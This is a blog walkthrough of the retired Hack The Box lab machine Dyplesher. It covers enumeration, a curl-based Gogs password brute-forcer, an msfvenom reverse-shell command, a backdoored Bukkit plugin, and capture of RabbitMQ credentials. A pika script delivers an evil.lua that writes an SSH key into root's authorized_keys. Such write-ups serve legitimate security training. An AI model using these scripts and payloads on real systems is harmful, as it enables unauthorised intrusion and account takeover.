---
layout: post  
title: "Dyplesher: Hack The Box Walkthrough"
date: 2020-10-25 09:11:23 +0000
last_modified_at: 2020-10-25 09:11:23 +0000
category: Walkthrough
tags: ["Hack The Box", Dyplesher, retired, Linux, Insane]
comments: true
protect: false
image:
  feature: dyplesher-htb-walkthrough.png
---

This post documents the complete walkthrough of Dyplesher, a retired vulnerable [VM][1] created by [felamos][2] and [yuntao][3], and hosted at [Hack The Box][4]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Dyplesher is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let\'s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.190 --rate=500

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-06-03 04:46:30 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 25565/tcp on 10.10.10.190
Discovered open port 11211/tcp on 10.10.10.190
Discovered open port 3000/tcp on 10.10.10.190
Discovered open port 25562/tcp on 10.10.10.190
Discovered open port 5672/tcp on 10.10.10.190
Discovered open port 22/tcp on 10.10.10.190
Discovered open port 4369/tcp on 10.10.10.190
Discovered open port 25672/tcp on 10.10.10.190
Discovered open port 80/tcp on 10.10.10.190
```

This is interesting. It's been awhile since I last saw so many open ports. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p22,80,3000,4369,5672,11211,25562,25565,25672 -A --reason 10.10.10.190 -oN nmap.txt
...
PORT      STATE SERVICE    REASON         VERSION
22/tcp    open  ssh        syn-ack ttl 63 OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 7e:ca:81:78:ec:27:8f:50:60:db:79:cf:97:f7:05:c0 (RSA)
|   256 e0:d7:c7:9f:f2:7f:64:0d:40:29:18:e1:a1:a0:37:5e (ECDSA)
|_  256 9f:b2:4c:5c:de:44:09:14:ce:4f:57:62:0b:f9:71:81 (ED25519)
80/tcp    open  http       syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Dyplesher
3000/tcp  open  ppp?       syn-ack ttl 63
| fingerprint-strings:
|   GenericLines, Help:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gogs=1373fabf1ea977e0; Path=/; HttpOnly
|     Set-Cookie: _csrf=M3zQhIDgYJOwDKGS4LYkVR_JUSU6MTU5MTE1OTk3MjYzMjExODUyNw%3D%3D; Path=/; Expires=Thu, 04 Jun 2020 04:52:52 GMT; HttpOnly
|     Date: Wed, 03 Jun 2020 04:52:52 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
|     <meta name="author" content="Gogs" />
|     <meta name="description" content="Gogs is a painless self-hosted Git service" />
|     <meta name="keywords" content="go, git, self-hosted, gogs">
|     <meta name="referrer" content="no-referrer" />
|     <meta name="_csrf" content="M3zQhIDgYJOwDKGS4LYkVR_JUSU6MTU5MTE1OTk3MjYzMjExODUyNw==" />
|     <meta name="_suburl" content="" />
|     <meta proper
|   HTTPOptions:
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gogs=d96eafe4a545f343; Path=/; HttpOnly
|     Set-Cookie: _csrf=qhUWUpLwdE4hjg2SpQF5Haz6uSA6MTU5MTE1OTk3OTY0MTYyMDY0NA%3D%3D; Path=/; Expires=Thu, 04 Jun 2020 04:52:59 GMT; HttpOnly
|     Date: Wed, 03 Jun 2020 04:52:59 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
|     <meta name="author" content="Gogs" />
|     <meta name="description" content="Gogs is a painless self-hosted Git service" />
|     <meta name="keywords" content="go, git, self-hosted, gogs">
|     <meta name="referrer" content="no-referrer" />
|     <meta name="_csrf" content="qhUWUpLwdE4hjg2SpQF5Haz6uSA6MTU5MTE1OTk3OTY0MTYyMDY0NA==" />
|     <meta name="_suburl" content="" />
|_    <meta
4369/tcp  open  epmd       syn-ack ttl 63 Erlang Port Mapper Daemon
| epmd-info:
|   epmd_port: 4369
|   nodes:
|_    rabbit: 25672
5672/tcp  open  amqp       syn-ack ttl 63 RabbitMQ 3.7.8 (0-9)
| amqp-info:
|   capabilities:
|     publisher_confirms: YES
|     exchange_exchange_bindings: YES
|     basic.nack: YES
|     consumer_cancel_notify: YES
|     connection.blocked: YES
|     consumer_priorities: YES
|     authentication_failure_close: YES
|     per_consumer_qos: YES
|     direct_reply_to: YES
|   cluster_name: rabbit@dyplesher
|   copyright: Copyright (C) 2007-2018 Pivotal Software, Inc.
|   information: Licensed under the MPL.  See http://www.rabbitmq.com/
|   platform: Erlang/OTP 22.0.7
|   product: RabbitMQ
|   version: 3.7.8
|   mechanisms: PLAIN AMQPLAIN
|_  locales: en_US
11211/tcp open  memcache?  syn-ack ttl 62
25562/tcp open  unknown    syn-ack ttl 63
25565/tcp open  minecraft? syn-ack ttl 63
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, LDAPSearchReq, LPDString, SIPOptions, SSLSessionReq, TLSSessionReq, afp, ms-sql-s, oracle-tns:
|     '{"text":"Unsupported protocol version"}
|   NotesRPC:
|     q{"text":"Unsupported protocol version 0, please use one of these versions:
|_    1.8.x, 1.9.x, 1.10.x, 1.11.x, 1.12.x"}
25672/tcp open  unknown    syn-ack ttl 63
```

`25565/tcp` is minecraft? Really??!! Anyways, this is what the `http` service looks like.

{% include image.html image_alt="c3fe83f2.png" image_src="/a2cd26f2-ab3c-489f-adbb-94571685c40f/c3fe83f2.png" %}

Sure looks like it has something to do with Minecraft. I'd better put `dyplesher.htb` and `test.dyplesher.htb` into `/etc/hosts` while I'm at it. By the way, there's also a Gogs service at `dyplesher.htb:3000` and this is what is looks like.

{% include image.html image_alt="db134dad.png" image_src="/a2cd26f2-ab3c-489f-adbb-94571685c40f/db134dad.png" %}

And this is what `test.dyplesher.htb` looks like.

{% include image.html image_alt="36a112d8.png" image_src="/a2cd26f2-ab3c-489f-adbb-94571685c40f/36a112d8.png" %}

### Directory/File Enumeration

Let's see what we can find out with `wfuzz` and `quickhits.txt` from SecLists.

_dyplesher.htb_

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -t 20 --hc '301,403,404' http://dyplesher.htb/FUZZ
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://dyplesher.htb/FUZZ
Total requests: 2439

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000641:   302        11 L     22 W     350 Ch      "/api/user"
000001537:   200        83 L     209 W    4188 Ch     "/login"

Total time: 41.34964
Processed Requests: 2439
Filtered Requests: 2437
Requests/sec.: 58.98478
```

There's a login page at `http://dyplesher.htb/login`. Well, `/api/user` redirects to `/login` too.

{% include image.html image_alt="4c4671a1.png" image_src="/a2cd26f2-ab3c-489f-adbb-94571685c40f/4c4671a1.png" %}

_test.dyplesher.htb_

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -t 20 --hc '403,404' http://test.dyplesher.htb/FUZZ
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://test.dyplesher.htb/FUZZ
Total requests: 2439

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000106:   301        9 L      28 W     323 Ch      "/.git"
000000109:   200        11 L     29 W     268 Ch      "/.git/config"
000000110:   200        1 L      2 W      23 Ch       "/.git/HEAD"
000000111:   200        1 L      10 W     200 Ch      "/.git/index"
000000113:   200        1 L      10 W     162 Ch      "/.git/logs/HEAD"
000000114:   301        9 L      28 W     333 Ch      "/.git/logs/refs"
000001965:   200        0 L      0 W      0 Ch        "/README.md"

Total time: 25.46233
Processed Requests: 2439
Filtered Requests: 2432
Requests/sec.: 95.78853
```

Looks like we have `git` repository!

### GitDumper

Let's dump it out with [GitDumper](https://github.com/internetwache/GitTools/tree/master/Dumper).

{% include image.html image_alt="82db4bdc.png" image_src="/a2cd26f2-ab3c-489f-adbb-94571685c40f/82db4bdc.png" %}

Hmm, there's only one commit.

{% include image.html image_alt="44a261f8.png" image_src="/a2cd26f2-ab3c-489f-adbb-94571685c40f/44a261f8.png" %}

But, can we restore the files?

{% include image.html image_alt="e8f65264.png" image_src="/a2cd26f2-ab3c-489f-adbb-94571685c40f/e8f65264.png" %}

Use the suggested command to fix the upstream.

{% include image.html image_alt="bff1f311.png" image_src="/a2cd26f2-ab3c-489f-adbb-94571685c40f/bff1f311.png" %}

And what do we have here?

<div class="filename"><span>index.php</span></div>

```php
<HTML>
<BODY>
<h1>Add key and value to memcache<h1>
<FORM METHOD="GET" NAME="test" ACTION="">
<INPUT TYPE="text" NAME="add">
<INPUT TYPE="text" NAME="val">
<INPUT TYPE="submit" VALUE="Send">
</FORM>

<pre>
<?php
if($_GET['add'] != $_GET['val']){
        $m = new Memcached();
        $m->setOption(Memcached::OPT_BINARY_PROTOCOL, true);
        $m->setSaslAuthData("felamos", "zxcvbnm");
        $m->addServer('127.0.0.1', 11211);
        $m->add($_GET['add'], $_GET['val']);
        echo "Done!";
}
else {
        echo "its equal";
}
?>
</pre>

</BODY>
</HTML>
```

The credential (`felamos:zxcvbnm`) doesn't fit in any of the services other than `memcached`. What else do we have?

### Memcached

Let's see what we can find in `memcached`. For that, we need to use [`memcached-cli`](https://www.npmjs.com/package/memcached-cli) since it supports SASL authentication.

{% include image.html image_alt="cafbe32e.png" image_src="/a2cd26f2-ab3c-489f-adbb-94571685c40f/cafbe32e.png" %}

I got connected, now what?

### Gogs Authentication Brute-Force

From the site we know that there are three users.

{% include image.html image_alt="0ee8aa1b.png" image_src="/a2cd26f2-ab3c-489f-adbb-94571685c40f/0ee8aa1b.png" %}

And from the `memcached` repository we dumped earlier, we know that it came from `felamos`. It's obviously a private repository because we can't see it when we explore the respositories.

{% include image.html image_alt="f7ddb0ab.png" image_src="/a2cd26f2-ab3c-489f-adbb-94571685c40f/f7ddb0ab.png" %}

Armed with these insights, I wrote a simple shell brute-forcer script to see if I can obtain the password to access `felamos`'s account. The script is mainly driven by `curl` and coupled with GNU Parallel, we get a multi-threaded brute-forcer of sorts.

<div class="filename"><span>brute.sh</span></div>

```bash
#!/bin/bash

USER=$1
PASS=$2

function die() {
    killall perl 2>/dev/null
}

export -f die

function check() {

    local HOST=dyplesher.htb
    local PORT=3000
    local COOKIE=$(mktemp -u)
    local PROXY=127.0.0.1:8080
    local USER=$1
    local PASS=$2

    CSRF=$(curl -s \
                -c $COOKIE \
                http://$HOST:$PORT/user/login \
           | grep -E '_csrf' \
           | grep -Eo 'value=".*"' \
           | sed -r 's/value=//' \
           | tr -d '"')

    CSRF=$(urlencode $CSRF)

    CODE=$(curl -s \
                -b $COOKIE \
                -d "_csrf=$CSRF&user_name=$USER&password=$PASS" \
                -o /dev/null \
                -w "%{http_code}" \
                http://$HOST:$PORT/user/login)

    if [ $CODE -eq 302 ]; then
        echo "[+] User is $USER, Password is $PASS"
        die
    fi

    # clean up
    rm -f $COOKIE
}

export -f check

parallel -q -j10 check ::: $USER :::: $PASS
```

The script runs more efficient with a large wordlist like `rockyou.txt` split up into smaller wordlists. I'd split up `rockyou.txt` into 100 chunks, e.g. `rockyou_000` to `rockyou_099`. Let's give it a shot.

{% include image.html image_alt="8d95af67.png" image_src="/a2cd26f2-ab3c-489f-adbb-94571685c40f/8d95af67.png" %}

Now, let's verify the password.

{% include image.html image_alt="769f9a1d.png" image_src="/a2cd26f2-ab3c-489f-adbb-94571685c40f/769f9a1d.png" %}

Not too bad, considering that `rockyou.txt` has about 14 million lines.

### Gitlab Repository Backup

There's no point in cloning the `memcached` repository because it's the same we'd dumped earlier. Let's focus in on the `gitlab` repository.

{% include image.html image_alt="3e6b7419.png" image_src="/a2cd26f2-ab3c-489f-adbb-94571685c40f/3e6b7419.png" %}

Hmm, looks like there's only one commit too. Fret not, several repositories are "bundled" and saved in `repo.zip` like so.

{% include image.html image_alt="db165835.png" image_src="/a2cd26f2-ab3c-489f-adbb-94571685c40f/db165835.png" %}

Check out the "bundles" in `repo.zip`.

{% include image.html image_alt="97c2717b.png" image_src="/a2cd26f2-ab3c-489f-adbb-94571685c40f/97c2717b.png" %}

According to `git-bundle` [documentation](https://git-scm.com/docs/git-bundle),

> Some workflows require that one or more branches of development on one machine be replicated on another machine, but the two machines cannot be directly connected, and therefore the interactive Git protocols (git, ssh, http) cannot be used.
>
> The _git bundle_ command packages objects and references in an archive at the originating machine, which can then be imported into another repository using _git fetch_, _git pull_, or _git clone_, after moving the archive by some means (e.g., by sneakernet).
>
> As no direct connection between the repositories exists, the user must specify a basis for the bundle that is held by the destination repository: the bundle assumes that all objects in the basis are already in the destination repository.

Suffice to say, each bundle is an archive of a repository.

#### Unbundling the bundles

First, we extract the bundle files from `repo.zip` like so.

```
# mkdir git_bundles && 7z e repo.zip -ogit_bundles *.bundle -r

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.utf8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-7700HQ CPU @ 2.80GHz (906E9),ASM,AES-NI)

Scanning the drive for archives:
1 file, 22015460 bytes (21 MiB)

Extracting archive: repo.zip
--
Path = repo.zip
Type = zip
Physical Size = 22015460

Everything is Ok

Files: 4
Size:       22012461
Compressed: 22015460
```

Next, we clone each repository like so.

```
# for b in ../git_bundles/*.bundle; do git clone -b master $b; done
Cloning into '4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a'...
Receiving objects: 100% (39/39), 10.46 KiB | 10.46 MiB/s, done.
Resolving deltas: 100% (12/12), done.
Cloning into '4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce'...
Receiving objects: 100% (51/51), 20.94 MiB | 68.49 MiB/s, done.
Resolving deltas: 100% (5/5), done.
Cloning into '6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b'...
Receiving objects: 100% (85/85), 30.69 KiB | 15.34 MiB/s, done.
Resolving deltas: 100% (40/40), done.
Cloning into 'd4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35'...
Receiving objects: 100% (21/21), 16.98 KiB | 16.98 MiB/s, done.
Resolving deltas: 100% (9/9), done.
```

During enumeration of the repositories, it appears that only `4e07...9fce` has something to do with `felamos` and Minecraft.

{% include image.html image_alt="32dea525.png" image_src="/a2cd26f2-ab3c-489f-adbb-94571685c40f/32dea525.png" %}

{% include image.html image_alt="afc0a3ce.png" image_src="/a2cd26f2-ab3c-489f-adbb-94571685c40f/afc0a3ce.png" %}

I found a Sqlite3 database, `users.db` in `plugins/LoginSecurity`.

{% include image.html image_alt="911159f3.png" image_src="/a2cd26f2-ab3c-489f-adbb-94571685c40f/911159f3.png" %}

And a BCrypt hash in `users.db`.

{% include image.html image_alt="9ca67fb0.png" image_src="/a2cd26f2-ab3c-489f-adbb-94571685c40f/9ca67fb0.png" %}

It didn't took long for JtR to crack the hash.

{% include image.html image_alt="89ad83cb.png" image_src="/a2cd26f2-ab3c-489f-adbb-94571685c40f/89ad83cb.png" %}

This must be the password to the `dyplesher.htb/login`. The email address must be `felamos@dyplesher.htb`.

### Minecraft Dashboard

Indeed.

{% include image.html image_alt="3ae00b96.png" image_src="/a2cd26f2-ab3c-489f-adbb-94571685c40f/3ae00b96.png" %}

### Malicious Plugin

On the sidebar there are options to add, delete and reload a plugin. If I'd to guess, I'd say the next step is to develop a malicious plugin. But how?

I first noted that on the **Delete Plugin** page there are three plugins. They are Bukkit plugins and one of them has a `.jar` extension.

{% include image.html image_alt="e92dc7f6.png" image_src="/a2cd26f2-ab3c-489f-adbb-94571685c40f/e92dc7f6.png" %}

Let's see for the sake of testing, if it accepts a payload encoded by `msfvenom` like so.

```
# msfvenom -p java/shell_reverse_tcp LHOST=10.10.16.125 LPORT=1234 -f jar -o rev.jar
```

{% include image.html image_alt="dc1ca299.png" image_src="/a2cd26f2-ab3c-489f-adbb-94571685c40f/dc1ca299.png" %}

Snap, it doesn't. What's next?

#### Backdooring a Bukkit Plugin

I had a little reading on how to develop a Bukkit plugin from this [tutorial](https://bukkit.gamepedia.com/Plugin_Tutorial). Looks like it's pretty easy to backdoor'd a Bukkit plugin—all we need to do is to override the `onEnable()` method.

The PlugMan web interface also imposed two restrictions on plugin upload:

1. The name of the plugin must not be more than ten characters.
2. The file size of the plugin must not be more than 1Mb.

It turned out to be a blessing in disguise. All I'd to do was to look for a Bukkit plugin in the Bukkit project page that meet these requirements and have their source code listed in GitHub. I chose [OpenInv](https://github.com/lishid/OpenInv). Simply clone the repository and open the following file to insert your backdoor.

<div class="filename"><span>plugin/src/main/java/com/lishid/openinv/OpenInv.java</span></div>

```java
public void onEnable() {

    // Save default configuration if not present.
    this.saveDefaultConfig();

    // Get plugin manager
    PluginManager pm = this.getServer().getPluginManager();

    this.accessor = new InternalAccessor(this);

    this.languageManager = new LanguageManager(this, "en_us");

    // Version check
    if (this.accessor.isSupported()) {
        // Update existing configuration. May require internal access.
        new ConfigUpdater(this).checkForUpdates();

        // Register listeners
        pm.registerEvents(new PlayerListener(this), this);
        pm.registerEvents(new PluginListener(this), this);
        pm.registerEvents(new InventoryClickListener(), this);
        pm.registerEvents(new InventoryCloseListener(this), this);
        // Bukkit will handle missing events for us, attempt to register InventoryDragEvent without a version check
        pm.registerEvents(new InventoryDragListener(), this);

        // Register commands to their executors
        OpenInvCommand openInv = new OpenInvCommand(this);
        this.setCommandExecutor("openinv", openInv);
        this.setCommandExecutor("openender", openInv);
        this.setCommandExecutor("searchcontainer", new SearchContainerCommand(this));
        SearchInvCommand searchInv = new SearchInvCommand(this);
        this.setCommandExecutor("searchinv", searchInv);
        this.setCommandExecutor("searchender", searchInv);
        this.setCommandExecutor("searchenchant", new SearchEnchantCommand(this));
        ContainerSettingCommand settingCommand = new ContainerSettingCommand(this);
        this.setCommandExecutor("silentcontainer", settingCommand);
        this.setCommandExecutor("anycontainer", settingCommand);

    } else {
        this.getLogger().info("Your version of CraftBukkit (" + this.accessor.getVersion() + ") is not supported.");
        this.getLogger().info("If this version is a recent release, check for an update.");
        this.getLogger().info("If this is an older version, ensure that you've downloaded the legacy support version.");
    }

    // Your backdoor code here
}
```

There's no need to install Java IDEs to compile the plugin. All you need is Maven. Go to the directory where `pom.xml` is located and use the following command.

```
# mvn clean package
```

Sadly after numerous resets, I couldn't get a reverse shell to execute. Maybe there's a firewall blocking outbound traffic? Well, I noticed that when a plugin is loaded (more like enabled), there are some diagnostic messages in the console's output. Perhaps I can make use of that to enumerate the file system.

Here, I enumerated the directories in `/var/www` with the following backdoor code.

{% include image.html image_alt="6d1322e1.png" image_src="/a2cd26f2-ab3c-489f-adbb-94571685c40f/6d1322e1.png" %}

The key code to output to the console is `this.getLogger()`. This is akin to `console.log()` in JavaScript.

{% include image.html image_alt="28f8fae4.png" image_src="/a2cd26f2-ab3c-489f-adbb-94571685c40f/28f8fae4.png" %}

Interesting. Let's see if we can write a PHP backdoor to `/var/www/test`, which I'm assuming is the document root of `test.dyplesher.org`.

{% include image.html image_alt="b6de6174.png" image_src="/a2cd26f2-ab3c-489f-adbb-94571685c40f/b6de6174.png" %}

Let's give it a shot.

{% include image.html image_alt="84c7dfbe.png" image_src="/a2cd26f2-ab3c-489f-adbb-94571685c40f/84c7dfbe.png" %}

Splendid!

## Low-Privilege Shell

Since I've a backdoor as `MinatoTW`, let's do what we always do.

{% include image.html image_alt="be19aa24.png" image_src="/a2cd26f2-ab3c-489f-adbb-94571685c40f/be19aa24.png" %}

Write a SSH public key we control to `/home/MinatoTW/.ssh/authorized_keys`.

{% include image.html image_alt="ec9f2e88.png" image_src="/a2cd26f2-ab3c-489f-adbb-94571685c40f/ec9f2e88.png" %}

Finally! :triumph:

### Packet Capture with Wireshark

During enumeration of `MinatoTW`'s account, I notice that the account is a member of the group `wireshark`. On top of that, only members of this group can run `dumpcap`. Since I don't know which network interfaces contain the "juicy" information I need, let's just capture all like so.

```
$ tshark -ni any -F -w /tmp/dyplesher.pcap
```

This is the capture file properties after `scp`'ing it to my machine for further analysis.

{% include image.html image_alt="b83c1241.png" image_src="/a2cd26f2-ab3c-489f-adbb-94571685c40f/b83c1241.png" %}

As you can see, a mere 33 seconds of capturing on all interfaces resulted in a PCAP file of almost 6Mb.

#### PCAP Analysis

A cursory preview of the protocol hierarchy in Wireshark reveals a familiar protocol observed in the nmap scan above: Advanced Message Queuing Protocol (or AMQP).

{% include image.html image_alt="8212b744.png" image_src="/a2cd26f2-ab3c-489f-adbb-94571685c40f/8212b744.png" %}

There's plenty of messages (or in this case JSON objects) published by `yuntao` to RabbitMQ. Note the password (`EashAnicOc3Op`) used by `yuntao` to authenticate to RabbitMQ.

{% include image.html image_alt="2e3daa07.png" image_src="/a2cd26f2-ab3c-489f-adbb-94571685c40f/2e3daa07.png" %}

We can extract them with `tshark` like so.

```
# tshark -r dyplesher.pcap -Y "amqp" -Tfields -e"amqp.payload" | sed -r '/^$/d' | xxd -p -r | jq
```

As far as we're concerned, only these three accounts should matter.

{% include image.html image_alt="a293bb37.png" image_src="/a2cd26f2-ab3c-489f-adbb-94571685c40f/a293bb37.png" %}

Maybe one of the passwords would allow me to escalate my privileges to that account? Let's try `felamos` since the UID is 1000.

{% include image.html image_alt="6d569744.png" image_src="/a2cd26f2-ab3c-489f-adbb-94571685c40f/6d569744.png" %}

Indeed.

## Privilege Escalation

During enumeration of `felamos`' account, I notice the presence of `send.sh` in `/home/felamos/yuntao`.

<div class="filename"><span>send.sh</span></div>

```
#!/bin/bash

echo 'Hey yuntao, Please publish all cuberite plugins created by players on plugin_data "Exchange" and "Queue". Just send url to download plugins and our new code will review it and working plugins will be added to the server.' >  /dev/pts/{}
```

If I'd to guess, I'd say that I probably need to publish a message to RabbitMQ in AMQP 0-9-1 a URL to a malicious Lua script (Cuberite plugins are written in Lua) and that a consumer will retrieve the malicious Lua script and hopefully executes it as `root`. To do that, I'll need a RabbitMQ/AMQP 0-9-1 client. Enter Pika.

### RabbitMQ Client - Pika

To that end, I wrote the following script to "publish" my malicious script. However, remember that no outbound traffic is allowed? To overcome that problem, I'd to set up SSH remote port forwarding to the Python HTTPServer hosting the malicious Lua script like so.

```
# ssh -R8000:127.0.0.1:8000 -i minatotw MinatoTW@10.10.10.190
```

For now, I don't have the malicious Lua script developed. The purpose of this exercise is to prove that someone or something will, upon consuming the queue for the URL, download the malicious Lua script.

<div class="filename"><span>amqp.py</span></div>

```python
import pika

parameters = pika.URLParameters('amqp://yuntao:EashAnicOc3Op@10.10.10.190')
connection = pika.BlockingConnection(parameters)
body='http://127.0.0.1:8000/evil.lua'
channel = connection.channel()
channel.queue_declare(
        queue='plugin_data',
        durable=True)
channel.exchange_declare(
        exchange='plugin_data',
        durable=True)
channel.queue_bind('plugin_data', 'plugin_data', '')
channel.basic_publish(
        exchange='plugin_data', routing_key='', body=body,
        properties=pika.BasicProperties(content_type='text/uri-list', delivery_mode=1))
connection.close()
```

Let's give it a shot.

{% include image.html image_alt="083c5481.png" image_src="/a2cd26f2-ab3c-489f-adbb-94571685c40f/083c5481.png" %}

Ok. We got the URL published to the `plugin_data` exchange and queue. What about our Python HTTPServer? Is there any request?

{% include image.html image_alt="9ca3a301.png" image_src="/a2cd26f2-ab3c-489f-adbb-94571685c40f/9ca3a301.png" %}

Awesome.

### Malicious Lua Script

The idea here is simple. Write a SSH public key we control to `/root/.ssh/authorized_keys`.

<div class="filename"><span>evil.lua</span></div>

```lua
file = io.open('/root/.ssh/authorized_keys', 'w+')
ssh = 'ssh-rsa AAAAB3N...P8g2Yw0E='
file.write(ssh)
file.close()
```

And we have root!

{% include image.html image_alt="72653a51.png" image_src="/a2cd26f2-ab3c-489f-adbb-94571685c40f/72653a51.png" %}

Getting `root.txt` is trivial.

{% include image.html image_alt="60f5cf33.png" image_src="/a2cd26f2-ab3c-489f-adbb-94571685c40f/60f5cf33.png" %}

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/253
[2]: https://www.hackthebox.eu/home/users/profile/23790
[3]: https://www.hackthebox.eu/home/users/profile/12438
[4]: https://www.hackthebox.eu/
